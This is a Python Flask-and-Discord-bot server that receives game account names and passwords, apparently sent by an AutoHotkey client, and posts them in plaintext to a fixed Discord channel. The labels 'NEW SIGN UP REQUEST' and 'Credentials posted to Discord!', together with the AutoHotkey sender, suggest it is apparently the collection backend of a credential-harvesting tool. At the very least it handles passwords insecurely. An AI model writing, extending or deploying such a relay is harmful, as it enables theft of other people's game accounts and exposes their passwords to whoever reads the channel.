import os
import threading
import asyncio
from flask import Flask, request
import discord
from discord.ext import commands

# Initialize Flask app
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

# Discord Bot Setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

CHANNEL_ID = 1558729581244977185 

async def send_credential_alert(game_name, game_password):
    try:
        channel = bot.get_channel(CHANNEL_ID)
        print(f"DEBUG: Looking for channel {CHANNEL_ID}, found: {channel}")
        if channel:
            await channel.send(
                f"🆕 **NEW SIGN UP REQUEST!**\n"
                f"🎮 **Game Name:** {game_name}\n"
                f"🔑 **Game Password:** {game_password}"
            )
            print("SUCCESS: Credentials posted to Discord!")
        else:
            print(f"ERROR: Bot could not find channel {CHANNEL_ID}. Make sure the bot is added to your server!")
    except Exception as e:
        print(f"ERROR: Failed to send message to Discord: {e}")

@app.route('/submit', methods=['POST'])
def handle_submission():
    # Safely handle form data sent by AutoHotkey
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form
        
    game_name = data.get('game_name', 'Unknown')
    game_password = data.get('game_password', 'Unknown')
    
    print(f"Received submission for Game Name: {game_name}")
    
    if bot.loop.is_running():
        asyncio.run_coroutine_threadsafe(send_credential_alert(game_name, game_password), bot.loop)
        return {"status": "success", "message": "Alert sent to Discord!"}, 200
    else:
        return {"status": "error", "message": "Bot is offline"}, 500

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_flask, daemon=True).start()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')

bot.run(os.environ.get("DISCORD_TOKEN"))